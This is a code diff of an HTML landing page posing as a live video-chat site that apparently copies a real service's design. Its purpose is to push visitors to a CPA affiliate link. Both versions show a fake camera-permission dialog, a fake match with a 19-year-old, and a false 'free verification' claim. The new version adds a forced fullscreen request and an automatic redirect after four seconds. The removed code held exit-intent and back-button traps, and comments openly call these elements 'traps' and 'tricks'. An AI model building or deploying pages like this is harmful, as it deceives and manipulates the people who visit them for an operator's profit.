@@ -3,77 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instant Videochat - Live Now</title>
+    <title>Instant Videochat</title>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; user-select: none; }
-        body { background: radial-gradient(circle at center, #570b2a 0%, #1e030e 100%); color: #ffffff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        
+        /* Matching the deep maroon/purple background from image_731199.png */
+        body { background-color: #5b0a29; color: #ffffff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
 
-        /* --- NAVBAR (Matching image_731216.png & image_731199.png) --- */
-        .navbar { background-color: #000000; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #222; z-index: 50; }
+        /* --- NAVBAR (100% replica of image_731216.png & image_731199.png) --- */
+        .navbar { background-color: #000000; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #1a1a1a; z-index: 50; }
         .left-nav { display: flex; align-items: center; gap: 15px; }
-        .hamburger { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
-        .hamburger span { width: 20px; height: 2px; background-color: #ccc; }
         
-        .logo { display: flex; align-items: center; gap: 8px; font-weight: 900; font-size: 18px; line-height: 0.9; letter-spacing: -0.5px; }
-        .logo-icon { background-color: #ff1269; color: white; width: 32px; height: 24px; border-radius: 6px; position: relative; display: flex; justify-content: center; align-items: center; font-size: 16px; font-weight: bold; font-style: italic; }
-        .logo-icon::after { content: ''; position: absolute; right: -6px; top: 5px; width: 8px; height: 14px; background-color: #ff1269; border-radius: 2px; }
+        /* Hamburger Menu */
+        .hamburger { display: flex; flex-direction: column; gap: 5px; cursor: pointer; padding: 5px; }
+        .hamburger span { width: 22px; height: 2px; background-color: #ddd; }
         
-        .right-nav { display: flex; align-items: center; gap: 25px; }
-        .nav-icons { display: flex; gap: 20px; font-size: 11px; color: #888; text-align: center; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; transition: color 0.2s; }
-        .nav-item:hover { color: #fff; }
-        .nav-item i { font-size: 20px; font-style: normal; }
-        .login-btn { border: 1px solid #555; padding: 6px 20px; border-radius: 20px; font-size: 13px; font-weight: bold; cursor: pointer; }
+        /* Logo styling */
+        .logo { display: flex; align-items: center; gap: 8px; font-weight: 900; font-size: 19px; line-height: 1; letter-spacing: -0.5px; }
+        .logo-icon { background-color: #ff1269; color: white; width: 34px; height: 26px; border-radius: 8px; position: relative; display: flex; justify-content: center; align-items: center; font-size: 18px; font-weight: bold; font-style: italic; transform: skewX(-10deg); }
+        .logo-icon::after { content: ''; position: absolute; right: -8px; top: 5px; width: 8px; height: 16px; background-color: #ff1269; border-radius: 3px; transform: skewX(10deg); }
+        
+        .right-nav { display: flex; align-items: center; gap: 30px; }
+        .nav-icons { display: flex; gap: 25px; font-size: 11px; color: #777; text-align: center; font-weight: 500; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 6px; cursor: pointer; }
+        .nav-item i { font-size: 22px; font-style: normal; }
+        .nav-item.active { color: #fff; }
+        
+        .login-btn { border: 1px solid #555; padding: 8px 25px; border-radius: 25px; font-size: 14px; font-weight: bold; cursor: pointer; color: #fff; background: transparent; }
 
-        /* --- MAIN DASHBOARD --- */
-        .main-area { flex: 1; position: relative; display: flex; flex-direction: column; align-items: center; padding-top: 30px; }
+        /* --- MAIN DASHBOARD (Pre-Match) --- */
+        .main-area { flex: 1; position: relative; display: flex; flex-direction: column; align-items: center; padding-top: 50px; transition: filter 0.3s ease; }
         
-        /* Gender Selector */
-        .gender-selector { background: rgba(0,0,0,0.4); border: 1px solid #333; border-radius: 30px; display: flex; align-items: center; padding: 5px; gap: 10px; margin-bottom: 40px; }
-        .g-option { display: flex; align-items: center; gap: 8px; padding: 10px 20px; border-radius: 25px; font-size: 14px; font-weight: bold; cursor: pointer; color: #888; }
+        .gender-selector { background: rgba(0,0,0,0.5); border: 1px solid #333; border-radius: 40px; display: flex; align-items: center; padding: 5px; gap: 5px; margin-bottom: 50px; width: 90%; max-width: 400px; justify-content: space-between; }
+        .g-option { display: flex; align-items: center; gap: 8px; padding: 12px 15px; border-radius: 30px; font-size: 13px; font-weight: bold; cursor: pointer; color: #888; flex: 1; justify-content: center; }
         .g-option.active { background: rgba(255,255,255,0.1); color: #fff; }
-        .g-icon-f { color: #ff1269; font-size: 18px; }
-        .g-icon-m { color: #42a5f5; font-size: 18px; }
 
-        /* Radar Animation */
-        .radar-box { position: relative; width: 150px; height: 150px; display: flex; justify-content: center; align-items: center; margin-bottom: 30px; }
-        .radar-pulse { position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 2px solid #ff1269; animation: pulseRadar 2s infinite ease-out; }
-        .radar-pulse:nth-child(2) { animation-delay: 0.5s; }
-        .radar-pulse:nth-child(3) { animation-delay: 1s; }
-        @keyframes pulseRadar { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(2); opacity: 0; } }
+        /* Fake Radar */
+        .radar-box { position: relative; width: 120px; height: 120px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
+        .radar-pulse { position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 3px solid #ff1269; animation: pulseRadar 1.5s infinite ease-out; }
+        .radar-pulse:nth-child(2) { animation-delay: 0.4s; }
+        @keyframes pulseRadar { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(2.5); opacity: 0; } }
         
-        .status-text { font-size: 20px; font-weight: bold; color: #ff1269; margin-top: 20px; letter-spacing: 1px; }
+        .status-text { font-size: 18px; font-weight: bold; color: #ff1269; margin-top: 20px; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.5; } }
 
-        /* --- THE MASTERMIND PERMISSION MODAL (Matching image_731199.png) --- */
-        .permission-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; display: none; justify-content: center; align-items: center; padding: 20px; }
-        .permission-box { background: #0a0a0a; width: 100%; max-width: 420px; border-radius: 12px; padding: 35px 25px; text-align: center; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.8); animation: slideUp 0.4s ease; position: relative; cursor: pointer; }
-        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-
-        .cam-icon-large { color: #ff1269; font-size: 45px; margin-bottom: 15px; animation: gentlePulse 2s infinite; }
-        @keyframes gentlePulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        /* --- THE MASTERMIND PERMISSION TRAP (image_731199.png replica) --- */
+        .permission-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(91, 10, 41, 0.6); backdrop-filter: blur(8px); z-index: 100; display: none; justify-content: center; align-items: center; padding: 20px; flex-direction: column; cursor: pointer; }
         
-        .perm-title { font-size: 18px; font-weight: 900; margin-bottom: 15px; color: #fff; }
-        .perm-desc { font-size: 13px; color: #aaa; line-height: 1.6; margin-bottom: 25px; }
-
-        /* --- THE CPA BUTTON (Matching image_731539.png) --- */
-        .cpa-action-box { display: none; flex-direction: column; align-items: center; animation: fadeIn 0.5s; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        /* Fake background elements behind the modal */
+        .fake-bg-elements { position: absolute; width: 100%; max-width: 400px; height: 100px; border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; z-index: 99; display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; opacity: 0.3; pointer-events: none; }
         
-        .start-free-btn { background: #ffffff; color: #ff1269; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 12px; padding: 18px 40px; border-radius: 40px; font-weight: 900; font-size: 18px; box-shadow: 0 8px 20px rgba(255, 18, 105, 0.3); transition: transform 0.2s; width: 100%; max-width: 350px; }
-        .start-free-btn:hover { transform: scale(1.03); }
-        .btn-cam-icon { font-size: 24px; display: flex; align-items: center; }
+        /* The Modal Box */
+        .permission-box { background: #070707; width: 100%; max-width: 380px; border-radius: 16px; padding: 35px 25px; text-align: center; border: 1px solid #222; box-shadow: 0 20px 50px rgba(0,0,0,0.9); position: relative; z-index: 101; animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes popIn { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
 
-        /* EXIT INTENT */
-        .exit-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 9999; display: none; justify-content: center; align-items: center; padding: 20px; }
-        .exit-box { background: #111; padding: 35px 25px; border-radius: 12px; text-align: center; border: 2px solid #ff1269; max-width: 380px; }
+        .cam-icon-large { color: #ff1269; font-size: 50px; margin-bottom: 20px; }
+        .perm-title { font-size: 20px; font-weight: 900; margin-bottom: 15px; color: #fff; letter-spacing: -0.5px; }
+        .perm-desc { font-size: 14px; color: #e0e0e0; line-height: 1.5; margin-bottom: 20px; padding: 0 10px; }
+
+        /* --- FINAL CPA BUTTON TRAP (image_731539.png replica) --- */
+        .cpa-action-box { display: none; flex-direction: column; align-items: center; animation: popIn 0.3s; z-index: 102; width: 100%; }
         
+        .start-free-btn { background: #ffffff; color: #ff1269; text-decoration: none; display: flex; justify-content: center; align-items: center; gap: 12px; padding: 16px 30px; border-radius: 40px; font-weight: 900; font-size: 22px; width: 100%; max-width: 400px; box-shadow: 0 10px 30px rgba(255, 18, 105, 0.4); animation: pulseBtn 1.5s infinite; position: relative; overflow: hidden; }
+        .start-free-btn::before { content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(to right, transparent, rgba(255,18,105,0.1), transparent); transform: skewX(-20deg); animation: shine 2s infinite; }
+        
+        @keyframes shine { 100% { left: 200%; } }
+        @keyframes pulseBtn { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.03); } }
+        .btn-cam-icon { font-size: 26px; display: flex; align-items: center; }
+
         @media (max-width: 768px) { .nav-icons, .login-btn { display: none; } }
     </style>
 </head>
-<body>
+<body onclick="requestFullScreen()">
 
-    <!-- TOP NAVBAR -->
+    <!-- TOP NAVBAR (image_731216.png replica) -->
     <header class="navbar">
         <div class="left-nav">
             <div class="hamburger"><span></span><span></span><span></span></div>
@@ -86,7 +90,7 @@
             <div class="nav-icons">
                 <div class="nav-item"><i>🔥</i> Discover</div>
                 <div class="nav-item"><i>♡</i> Followings</div>
-                <div class="nav-item" style="color:#fff;"><i>📹</i> Search</div>
+                <div class="nav-item active"><i>📹</i> Search</div>
                 <div class="nav-item"><i>🕒</i> History</div>
                 <div class="nav-item"><i>💬</i> Messages</div>
             </div>
@@ -97,120 +101,100 @@
     <!-- DASHBOARD -->
     <div class="main-area" id="main-bg">
         <div class="gender-selector">
-            <div class="g-option active"><span class="g-icon-f">♀</span> Female</div>
-            <div class="g-option"><span class="g-icon-m">♂</span> Male</div>
-            <div class="g-option">⚥ Random Free</div>
+            <div class="g-option active" style="color: #ff1269;">♀ Female</div>
+            <div class="g-option" style="color: #42a5f5;">♂ Male</div>
+            <div class="g-option" style="color: #bbb;">⚥ Random Free</div>
         </div>
 
         <div class="radar-box" id="radar">
             <div class="radar-pulse"></div>
             <div class="radar-pulse"></div>
-            <div class="radar-pulse"></div>
-            <div style="font-size: 40px; position: absolute; z-index: 10;">📹</div>
+            <div style="font-size: 50px; z-index: 10;">📹</div>
         </div>
         
-        <div class="status-text" id="status-text">Searching for match...</div>
+        <div class="status-text" id="status-text">Locating match near you...</div>
     </div>
 
-    <!-- THE MASTERMIND PERMISSION TRAP -->
-    <div class="permission-overlay" id="perm-overlay" onclick="triggerCPATrap()">
-        <div class="permission-box" id="perm-box">
-            
-            <!-- Step 1: Fake Browser Permission -->
-            <div id="step-1-fake-perm">
-                <div class="cam-icon-large">📹</div>
-                <div class="perm-title">Allow access to your camera and microphone</div>
-                <div class="perm-desc">
-                    This app requires access to your camera and microphone so that other people can see and hear you. We'll request access separately for each browser and computer you use.
-                </div>
-                <div style="color: #ff1269; font-weight: bold; font-size: 14px; margin-top: 10px;">Tap anywhere to Allow</div>
-            </div>
-
-            <!-- Step 2: The CPA Button Trap -->
-            <div class="cpa-action-box" id="step-2-cpa">
-                <div style="font-size: 50px; margin-bottom: 10px;">🔒</div>
-                <div class="perm-title" style="color: #4caf50;">Match Connected!</div>
-                <div class="perm-desc" style="color: #ccc;">
-                    Due to high spam, we need to verify you are human before enabling your camera.<br><br>
-                    <b style="color: #ff1269;">Verification is 100% Free.</b>
-                </div>
-                
-                <!-- YOUR CPA LINK BUTTON -->
-                <a href="https://quicklink.pro/mypersonalvideo80" class="start-free-btn">
-                    <span class="btn-cam-icon">📹</span> Start Video Chat for FREE
-                </a>
-                <div style="font-size: 11px; color: #666; margin-top: 15px;">End-to-End Encrypted Secure Line</div>
-            </div>
-
+    <!-- THE MASTERMIND PERMISSION TRAP (image_731199.png replica) -->
+    <!-- The whole overlay is clickable and triggers the next step -->
+    <div class="permission-overlay" id="perm-overlay" onclick="showCPABtn()">
+        
+        <!-- Background fake elements for ultra-realism -->
+        <div class="fake-bg-elements">
+            <div style="color: #ffd700; font-size: 12px; font-weight: bold;">80% SALE<br>BRONZE VIP</div>
+            <div style="color: #fff; font-size: 18px; font-weight: bold;">39 : 02<br><span style="font-size:10px; color:#aaa;">HOURS MINS</span></div>
         </div>
-    </div>
 
-    <!-- EXIT INTENT POPUP -->
-    <div class="exit-overlay" id="exit-intent">
-        <div class="exit-box">
-            <div style="font-size: 45px; margin-bottom: 15px;">👩‍🦰</div>
-            <h2 style="color: #fff; margin-bottom: 10px;">She is waiting on cam!</h2>
-            <p style="color: #aaa; font-size: 14px; margin-bottom: 25px;">Your match just turned on her camera. Are you really going to disconnect now?</p>
-            <a href="https://quicklink.pro/mypersonalvideo80" class="start-free-btn" style="margin: 0 auto;">
-                <span class="btn-cam-icon">📹</span> CONNECT LIVE NOW
+        <!-- Fake Permission Modal -->
+        <div class="permission-box" id="step-1-fake-perm">
+            <div class="cam-icon-large">📹</div>
+            <div class="perm-title">Allow access to your camera and microphone</div>
+            <div class="perm-desc">
+                This app requires access to your camera and microphone so that other people can see and hear you. We'll request access separately for each browser and computer you use.
+            </div>
+            <div style="width: 60px; height: 60px; border-radius: 50%; background: rgba(255,255,255,0.1); margin: 0 auto; display: flex; justify-content: center; align-items: center; border: 2px solid #333;">
+                <div style="width: 30px; height: 30px; border-radius: 50%; background: #444;"></div>
+            </div>
+        </div>
+
+        <!-- FINAL CPA BUTTON (image_731539.png replica) -->
+        <div class="cpa-action-box" id="step-2-cpa">
+            <a href="https://quicklink.pro/mypersonalvideo80" class="start-free-btn" id="final-link">
+                <span class="btn-cam-icon">📹</span> Start Video Chat for FREE
             </a>
+            <div style="color: #fff; margin-top: 20px; font-size: 14px; font-weight: bold; background: rgba(0,0,0,0.6); padding: 8px 15px; border-radius: 20px;">
+                🔴 Match is waiting...
+            </div>
         </div>
+
     </div>
 
     <script>
-        // MASTERMIND TIMING SYSTEM
-        setTimeout(() => {
-            // Match found simulation
-            document.getElementById('radar').style.display = 'none';
-            document.getElementById('status-text').innerText = "Match Found: Chloe (19) 🟢";
-            document.getElementById('status-text').style.color = "#4caf50";
-            
-            // Trigger fake permission modal
-            setTimeout(() => {
-                document.getElementById('perm-overlay').style.display = 'flex';
-                document.getElementById('main-bg').style.filter = "blur(8px)";
-                if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
-            }, 800);
-        }, 2500);
-
-        // THE TRAP: Click anywhere on modal flips it to the CPA Action
-        let trapTriggered = false;
-        function triggerCPATrap() {
-            if(!trapTriggered) {
-                trapTriggered = true;
-                // Vibrate for psychological feedback
-                if(navigator.vibrate) navigator.vibrate(100);
-                
-                // Hide fake perm, show CPA button
-                document.getElementById('step-1-fake-perm').style.display = 'none';
-                document.getElementById('step-2-cpa').style.display = 'flex';
+        // TRICK 1: FULLSCREEN HACK
+        let isFullscreen = false;
+        function requestFullScreen() {
+            if (!isFullscreen && document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(err => { console.log("Fullscreen ignored"); });
+                isFullscreen = true;
             }
         }
 
-        // PREVENT MODAL CLOSE ON BACKGROUND CLICK
-        document.getElementById('perm-box').addEventListener('click', (e) => {
-            e.stopPropagation();
-            triggerCPATrap();
-        });
+        // AUTO-FLOW SCRIPT
+        setTimeout(() => {
+            // Stop radar, show match
+            document.getElementById('radar').style.display = 'none';
+            document.getElementById('status-text').innerText = "✅ Match Connected!";
+            document.getElementById('status-text').style.color = "#4caf50";
+            
+            // Pop up the permission trap
+            setTimeout(() => {
+                document.getElementById('perm-overlay').style.display = 'flex';
+                // Trigger phone vibration for notification feel
+                if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
+            }, 800);
+        }, 2000);
 
-        // EXIT-INTENT TRAP
-        let exitTriggered = false;
-        document.addEventListener("mouseout", (e) => {
-            if (e.clientY < 50 && !exitTriggered) {
-                exitTriggered = true;
-                document.getElementById('exit-intent').style.display = 'flex';
+        // TRICK 2: THE DOUBLE-BIND SWITCH (Any click on modal reveals the CPA button)
+        let trapActivated = false;
+        function showCPABtn() {
+            if(!trapActivated) {
+                trapActivated = true;
+                if(navigator.vibrate) navigator.vibrate(100);
+                
+                // Hide the fake text and show the final exact button
+                document.getElementById('step-1-fake-perm').style.display = 'none';
+                document.querySelector('.fake-bg-elements').style.display = 'none';
+                document.getElementById('step-2-cpa').style.display = 'flex';
+                
+                // TRICK 4: AUTO REDIRECT (If they hesitate for 4 seconds, force redirect)
+                setTimeout(() => {
+                    window.location.href = "https://quicklink.pro/mypersonalvideo80";
+                }, 4000);
+            } else {
+                // If they click again after button is shown, directly open the link
+                window.location.href = "https://quicklink.pro/mypersonalvideo80";
             }
-        });
-        
-        // Mobile back button trap illusion (pushes fake state)
-        history.pushState(null, null, location.href);
-        window.onpopstate = function () {
-            if (!exitTriggered) {
-                exitTriggered = true;
-                document.getElementById('exit-intent').style.display = 'flex';
-                history.pushState(null, null, location.href);
-            }
-        };
+        }
     </script>
 </body>
 </html>
